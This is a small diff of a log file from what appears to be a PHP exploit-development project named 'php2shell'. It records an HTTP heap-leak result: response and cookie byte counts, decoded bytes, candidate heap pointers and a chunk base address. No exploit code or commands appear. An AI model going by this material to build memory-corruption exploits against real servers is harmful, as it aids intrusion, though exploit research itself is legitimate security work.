@@ -1,4 +1,4 @@
-response=logs/http_heap_leak_20261021.resp bytes=12357 cookie_chars=11548 decoded=4096
+response=/Users/my/php2shell/logs/http_heap_leak_20261021.resp bytes=12357 cookie_chars=11548 decoded=4096
 candidate_ptrs=98
 chunk_bases=7ffff5e00000:98
   off=0x38 ptr=0x7ffff5ea90a0 chunk=0x7ffff5e00000
